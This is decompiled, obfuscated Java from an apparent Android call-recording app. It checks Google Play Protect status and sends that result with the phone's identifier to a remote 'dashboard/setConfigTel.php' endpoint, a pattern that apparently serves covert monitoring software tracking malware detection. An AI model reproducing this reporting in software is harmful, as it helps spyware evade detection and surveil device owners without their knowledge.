package com.yasoka.spcallrecord.recorder.call.a.c.j;

import a.c.e.e;
import android.content.Context;
import com.crashlytics.android.Crashlytics;
import com.google.android.gms.tasks.C0500c;
import com.google.android.gms.tasks.g;
import java.util.HashMap;
import java.util.Map;

/* compiled from: Util */
final class d implements C0500c<a.d.a.b.b.d.a> {

    /* renamed from: a reason: collision with root package name */
    final /* synthetic */ Context f303a;

    /* compiled from: Util */
    class a implements Runnable {

        /* renamed from: a reason: collision with root package name */
        final /* synthetic */ int f304a;

        a(int i) {
            this.f304a = i;
        }

        public void run() {
            HashMap hashMap = new HashMap();
            String str = "";
            StringBuilder a2 = a.b.a.a.a.a(str);
            a2.append(e.e(d.this.f303a));
            hashMap.put("idPhone", a2.toString());
            hashMap.put("type", "playProtect");
            StringBuilder sb = new StringBuilder();
            sb.append(str);
            sb.append(this.f304a);
            hashMap.put("data", sb.toString());
            a.c.e.a.b("dashboard/setConfigTel.php", (Map<String, String>) hashMap);
        }
    }

    d(Context context) {
        this.f303a = context;
    }

    public void a(g<a.d.a.b.b.d.a> gVar) {
        try {
            int i = -1;
            if (gVar.e() && ((a.d.a.b.b.d.a) gVar.b()).b()) {
                i = 1;
            }
            new Thread(new a(i)).start();
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }
}
